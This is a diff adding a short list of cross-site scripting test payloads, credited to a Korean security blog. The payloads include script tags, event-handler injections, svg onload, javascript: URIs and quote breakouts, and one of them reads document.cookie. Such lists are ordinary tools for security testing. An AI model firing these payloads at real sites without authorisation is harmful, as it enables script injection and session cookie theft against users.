@@ -1,0 +1,30 @@
+출처 : https://twoicefish-secu.tistory.com/198
+
+
+">asdf<script>alert('xss');</script>
+
+<input type="BUTTON" onmouseover="alert()">
+
+"><script>alert(1);</script>/>
+
+<img src="x:x" onerror="prompt()">
+
+<script>alert('xss');</script>"/>
+
+<script>prompt('test', 'test');</script>
+
+<asdf../<>
+
+">asdf<svg/onload=alert("")>
+
+asdf<svg/onload=prompt("")>
+
+"><a onmouseover="prompt()">aaaa</a>
+
+<IFRAME SRC='www.naver.com' onmouseout="confirm(document.cookie)"></IFRAME>
+
+<img src="javascript:alert('XSS')">
+
+</div>asdf</div></div></div><script>prompt()</script>asd
+
+"+onfocus="alert(/xss/)"+autofocus=   
